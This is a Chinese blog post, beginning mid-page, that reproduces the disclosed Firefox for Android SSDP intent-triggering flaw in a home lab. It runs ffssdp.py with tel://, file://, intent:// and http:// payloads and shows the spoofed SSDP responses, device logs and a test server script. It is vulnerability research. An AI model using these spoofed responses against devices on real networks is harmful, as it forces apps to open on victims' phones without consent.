fa-external-link-alt"></i></a>&amp;cc&#x3D;<a class="link"   href="mailto:&#x75;&#115;&#x65;&#x72;&#x32;&#x40;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#x6d;" >&#x75;&#115;&#x65;&#x72;&#x32;&#x40;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a> (指定收件人和抄送)<br><strong>http: 或 https:</strong><br>    - <strong>触发应用:</strong> 默认的网络浏览器 (如 Chrome, Firefox)。<br>    - <strong>作用:</strong> 在浏览器中打开指定的网页。<br>    - <strong>示例:</strong><br>        - <a class="link"   href="http://www.google.com/" >http://www.google.com<i class="fas fa-external-link-alt"></i></a>      </p><p><strong>geo:</strong><br>    - <strong>触发应用:</strong> 默认的地图应用 (如 Google Maps)。<br>    - <strong>作用:</strong> 显示地理位置或进行地点搜索。<br>    - <strong>示例:</strong><br>        - geo:39.9042,116.4074 (显示北京的经纬度位置)<br>        - geo:0,0?q&#x3D;Eiffel+Tower (搜索埃菲尔铁塔的位置)<br>        - geo:0,0?q&#x3D;39.9042,116.4074(Beijing) (显示经纬度位置并添加标签 “Beijing”)<br> <strong>market:</strong><br>    - <strong>触发应用:</strong> Google Play Store 应用商店。<br>    - <strong>作用:</strong> 打开 Play Store 到指定的应用详情页、开发者页面或搜索结果。<br>    - <strong>示例:</strong><br>        - market:&#x2F;&#x2F;details?id&#x3D;com.google.android.apps.maps (打开 Google Maps 的应用详情页)<br>        - market:&#x2F;&#x2F;search?q&#x3D;browser (在 Play Store 中搜索 “browser”)<br>        - market:&#x2F;&#x2F;developer?id&#x3D;Google+LLC (打开 Google LLC 的开发者页面)</p><p> <strong>file:</strong><br>    - <strong>触发应用:</strong> 文件管理器应用（如果安装并注册了处理此 Scheme）。<br>    - <strong>作用:</strong> 尝试打开本地文件。<br>    - <strong>重要说明:</strong> 出于安全原因，Android 对 file:&#x2F;&#x2F; URI 的访问有<strong>严格限制</strong>。应用通常不能随意访问其他应用的私有文件或任意的本地文件路径。直接从浏览器或不可信来源触发 file:&#x2F;&#x2F; URI 通常会被阻止或功能受限。应用内部访问文件通常使用 content:&#x2F;&#x2F; URI (通过 ContentProvider) 或 Storage Access Framework。<br>    - <strong>示例 (可能受限):</strong> file:&#x2F;&#x2F;&#x2F;sdcard&#x2F;Download&#x2F;document.pdf</p><h4 id="Android-intent-URI"><a href="#Android-intent-URI" class="headerlink" title="Android intent URI"></a>Android intent URI</h4><p>具体来源：<a class="link"   href="https://www.google.com/url?sa=E&q=https://cs.android.com/" >cs.android.com<i class="fas fa-external-link-alt"></i></a><br>查找frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;content&#x2F;Intent.java 文件，这里面有具体的原因，更详细<br>在这里给出已经总结好的结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">intent:<span class="comment">//host/path#Intent;</span></span><br><span class="line">    <span class="keyword">package</span>=&lt;package_name&gt;;</span><br><span class="line">    scheme=&lt;scheme_type&gt;;</span><br><span class="line">    action=&lt;action_name&gt;;</span><br><span class="line">    category=&lt;category&gt;;</span><br><span class="line">    component=&lt;component_path&gt;;</span><br><span class="line">    S.&lt;extra_key&gt;=&lt;extra_value&gt;;</span><br><span class="line">    end</span><br></pre></td></tr></table></figure><p>解释</p><ul><li><strong>intent</strong>:Scheme (协议头):这是整个 URI 的协议标识符。它告诉 Android 系统，这个 URI 不是一个普通的网页链接、文件路径或电话号码，而是一个需要被解析成 Android Intent 对象的特殊指令。</li><li><strong>#Intent;…;end</strong>:- <strong>Fragment (片段标识符):</strong> 这是 Intent URI 的核心部分，使用 # 号开始。它包含了一系列**键值对 (key&#x3D;value)**，用分号 (;) 分隔，用来描述 Intent 对象的各种属性（Action, Category, Package, Component, Extras 等）。Intent代表开始，end代表结束</li><li><strong>键值对属性</strong> (在 #Intent; 和 ;end 之间):<ul><li><strong>package&#x3D;<package_name><strong>（可选）:指定</strong>唯一</strong>能够处理此 Intent 的应用程序包名。</li><li><strong>scheme&#x3D;<scheme_type></strong>(可选)：指定 Intent 的 data URI 部分应该使用的协议方案 (Scheme)。<strong>注意:</strong> 这与整个 URI 的 intent: scheme 不同。<ul><li><strong>示例:</strong> scheme&#x3D;http, scheme&#x3D;tel, scheme&#x3D;geo。如果你在前面提供了 &#x2F;&#x2F;host&#x2F;path，这个 scheme 会被用来构成完整的 Data URI，例如 scheme&#x3D;http + &#x2F;&#x2F;example.com&#x2F; -&gt; Data 是 <a class="link"   href="http://example.com/%E3%80%82" >http://example.com/。<i class="fas fa-external-link-alt"></i></a></li></ul></li><li>-S. 前缀：传递附加数据（键值对）。</li></ul></li></ul><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>检测ActivityManage日志<br>它负责管理应用程序的生命周期（启动、暂停、停止）、管理 Activity 栈（用户看到的界面切换）、启动服务，以及<strong>最关键的——处理和分发 Intent</strong></p><h3 id="安卓默认的URL"><a href="#安卓默认的URL" class="headerlink" title="安卓默认的URL"></a>安卓默认的URL</h3><h4 id="拨号器-1"><a href="#拨号器-1" class="headerlink" title="拨号器"></a>拨号器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;tel://20250419&quot; </span><br><span class="line"></span><br><span class="line">  _____  _____                 .___</span><br><span class="line">_/ ____\/ ____\______ ______ __| _/_____</span><br><span class="line">\   __\\   __\/  ___//  ___// __ |\____ \</span><br><span class="line"> |  |   |  |  \___ \ \___ \/ /_/ ||  |_&gt; &gt;</span><br><span class="line"> |__|   |__| /____  &gt;____  &gt;____ ||   __/</span><br><span class="line">                  \/     \/     \/|__|</span><br><span class="line"></span><br><span class="line">...by initstring</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#######################################</span></span></span><br><span class="line">[*] MSEARCH LISTENER:        eth0</span><br><span class="line">[*] INTENT:                  tel://20250419</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#######################################</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[M-SEARCH]     New Host 192.168.165.49, Service Type: roku:ecp</span><br><span class="line">[M-SEARCH]     New Host 192.168.165.49, Service Type: media:router</span><br><span class="line">[M-SEARCH]     New Host 192.168.165.247, Service Type: urn:dial-multiscreen-org:service:dial:1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>系统响应并启动了拨号器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flame:/ # logcat | grep ActivityManager</span><br><span class="line">04-19 11:42:04.980  1435  1690 I ActivityManager: Start proc 19569:com.google.android.dialer/u0a142 for activity &#123;com.google.android.dialer/com.android.dialer.main.impl.MainActivity&#125;</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419114231.png"                                        ></p><p>这是其中一组相关流量信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 03:42:02 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: tel://20250419</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:f750933a-d123-c342-ae48-45d6a1f22c56</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:f750933a-d123-c342-ae48-45d6a1f22c56::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;file://storage/emulated/0/Download/access.log&quot;</span><br></pre></td></tr></table></figure><p>firefox无事发生</p><hr><p>Android系统上使用file:&#x2F;&#x2F;协议的限制。Android的WebView和浏览器出于安全考虑，通常不允许通过file:&#x2F;&#x2F;协议访问本地文件<br>所以无法访问</p><p><strong>各浏览器策略对比</strong></p><table><thead><tr><th><strong>浏览器</strong></th><th><code>file://</code> 支持情况</th><th>安全策略</th></tr></thead><tbody><tr><td>Firefox</td><td>默认禁用，需 <code>about:config</code> 调整</td><td>设置 <code>security.fileuri.strict_origin_policy</code> 为 <code>false</code> 可部分启用</td></tr><tr><td>Chrome</td><td>完全禁止</td><td>控制台显示 <code>Not allowed to load local resource</code></td></tr><tr><td>Samsung Internet</td><td>允许访问 <code>/sdcard/</code> 子目录</td><td>需手动授权文件夹访问权限</td></tr><tr><td>Via Browser</td><td>支持自定义本地文件访问</td><td>内置文件管理器导航</td></tr></tbody></table><h3 id="构建应用关联的Android-Intent-URL"><a href="#构建应用关联的Android-Intent-URL" class="headerlink" title="构建应用关联的Android Intent URL"></a>构建应用关联的Android Intent URL</h3><h4 id="首先是和firefox相关联的url"><a href="#首先是和firefox相关联的url" class="headerlink" title="首先是和firefox相关联的url"></a>首先是和firefox相关联的url</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;intent://example.com/#Intent;scheme=http;package=org.mozilla.firefox;end&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>流量信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 08:40:23 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: intent://example.com/#Intent;scheme=http;package=org.mozilla.firefox;end</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:076edbd0-e133-9a30-879a-3c62235bba08</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:076edbd0-e133-9a30-879a-3c62235bba08::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure><p>结果<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419164140.png"                                        ></p><h4 id="然后是尝试触发chrome"><a href="#然后是尝试触发chrome" class="headerlink" title="然后是尝试触发chrome"></a>然后是尝试触发chrome</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;intent://example.com/#Intent;scheme=http;package=com.android.chrome;end&quot;</span><br></pre></td></tr></table></figure><p>流量信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 08:45:50 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: intent://example.com/#Intent;scheme=http;package=com.android.chrome;end</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:905594bc-7745-19ec-d5dd-ca9f47a60b7e</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: urn:dial-multiscreen-org:service:dial:1</span><br><span class="line">USN: uuid:905594bc-7745-19ec-d5dd-ca9f47a60b7e::urn:dial-multiscreen-org:service:dial:1</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure><p>结果<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419164502.png"                                        ><br>当然了firefox必须是在启动状态的，不然无法触发</p><h3 id="检测http"><a href="#检测http" class="headerlink" title="检测http"></a>检测http</h3><p>然后检测http头的信息<br>”打开 Web 浏览器的 URI 方案定义为 <code>http</code> 或 <code>https</code>。但是，Firefox 移动版中的原生 SSDP 代码会自行处理这些 URL，而不会将它们传递给 Intent 系统。“<br>现在就是检测，当出现<a class="link"   href="http://ip.xml时是不是由firefox进行处理/" >http://ip.xml时是不是由firefox进行处理<i class="fas fa-external-link-alt"></i></a><br>这里进行了两次测试</p><h4 id="直接访问example-com"><a href="#直接访问example-com" class="headerlink" title="直接访问example.com"></a>直接访问example.com</h4><p>运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;http://example.com&quot; </span><br></pre></td></tr></table></figure><p>信息成功传递</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 06:31:21 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://example.com</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是firefox无事发生</p><h4 id="访问http-example-com-device-xml"><a href="#访问http-example-com-device-xml" class="headerlink" title="访问http://example.com/device.xml"></a>访问<a class="link"   href="http://example.com/device.xml" >http://example.com/device.xml<i class="fas fa-external-link-alt"></i></a></h4><p>指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;http://example.com/device.xml&quot; </span><br></pre></td></tr></table></figure><p>pcap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 07:29:47 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://example.com/device.xml</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure><p>firefox无事发生</p><h4 id="部署http服务设备"><a href="#部署http服务设备" class="headerlink" title="部署http服务设备"></a>部署http服务设备</h4><p>这一步是为了检测，是不是由firefox启动的intent。自己部署服务器就能更好的看到日志信息。<br>1.在termux安装python</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install python</span><br></pre></td></tr></table></figure><p>2.创建updp文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ./upnp-server &amp;&amp; cd ./upnp-server</span><br><span class="line">nano device.xml</span><br></pre></td></tr></table></figure><p>device.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-upnp-org:device-1-0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">specVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">major</span>&gt;</span>1<span class="tag">&lt;/<span class="name">major</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">minor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">minor</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">specVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">device</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">deviceType</span>&gt;</span>urn:roku.com:device:ecp:1<span class="tag">&lt;/<span class="name">deviceType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">friendlyName</span>&gt;</span>My Fake Roku<span class="tag">&lt;/<span class="name">friendlyName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">manufacturer</span>&gt;</span>Test Corp<span class="tag">&lt;/<span class="name">manufacturer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelName</span>&gt;</span>UPnP Test Device<span class="tag">&lt;/<span class="name">modelName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">UDN</span>&gt;</span>uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82<span class="tag">&lt;/<span class="name">UDN</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">serviceList</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">service</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">serviceType</span>&gt;</span>urn:roku.com:service:ecp:1<span class="tag">&lt;/<span class="name">serviceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">serviceId</span>&gt;</span>urn:roku.com:serviceId:ecp<span class="tag">&lt;/<span class="name">serviceId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">controlURL</span>&gt;</span>/control<span class="tag">&lt;/<span class="name">controlURL</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">serviceList</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">device</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8080 --bind 0.0.0.0</span><br></pre></td></tr></table></figure><p>4.在虚拟机启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;http://192.168.165.49:8080/device.xml&quot; </span><br></pre></td></tr></table></figure><p>这是部分流量文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 07:53:00 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://192.168.165.49:8080/device.xml</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:ddc5543d-9945-5a23-62be-360ea199a831</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:ddc5543d-9945-5a23-62be-360ea199a831::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure><p>文件被访问了<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419155531.png"                                        ><br>此外在调试中发现，开启reqable尝试对firefox进行抓包时，无反应，关掉reqable时才开始正常访问xml文件<br><strong>启用 Firefox 网络监控</strong><br>在 Firefox 地址栏输入：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about:networking</span><br></pre></td></tr></table></figure><p>可以看到的确是访问了目标xml文件<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419161107.png"                                        ></p><p>为了追踪其来源，编写了server.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_request</span>(<span class="params">self, code=<span class="string">&#x27;-&#x27;</span>, size=<span class="string">&#x27;-&#x27;</span></span>):</span><br><span class="line">        logging.info(</span><br><span class="line">            <span class="string">f&quot;UA:<span class="subst">&#123;self.headers[<span class="string">&#x27;User-Agent&#x27;</span>]&#125;</span> | IP:<span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span> | PATH:<span class="subst">&#123;self.path&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> logging</span><br><span class="line">    logging.basicConfig(</span><br><span class="line">        filename=<span class="string">&#x27;access.log&#x27;</span>,</span><br><span class="line">        level=logging.INFO,</span><br><span class="line">        <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8080</span>), CustomHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>这是部分日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2025-04-19 16:18:18,891 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml</span><br><span class="line">2025-04-19 16:18:19,890 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml</span><br><span class="line">2025-04-19 16:18:20,898 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在这份日志里只有firefox的记录，也就是说，http请求的确是firefox在处理</p><hr><p>这说明该漏洞不是简单的将LOCATION当成Intent 执行，对于http:&#x2F;&#x2F;和https:&#x2F;&#x2F;这样的标准的字段它有自己的处理模式，而对于非常规范围内的tel:&#x2F;&#x2F; 或 intent:&#x2F;&#x2F; 的处理路径它将其转发给了安卓处理</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://initblog.com/2020/firefox-android/" >https://initblog.com/2020/firefox-android/<i class="fas fa-external-link-alt"></i></a><br>另一个视角的博客:<a class="link"   href="https://blog.mozilla.org/attack-and-defense/2020/11/10/firefox-for-android-lan-based-intent-triggering/?utm_source=chatgpt.com" >https://blog.mozilla.org/attack-and-defense/2020/11/10/firefox-for-android-lan-based-intent-triggering/?utm_source=chatgpt.com<i class="fas fa-external-link-alt"></i></a><br>firefox官网，在这里查找漏洞信息:<a 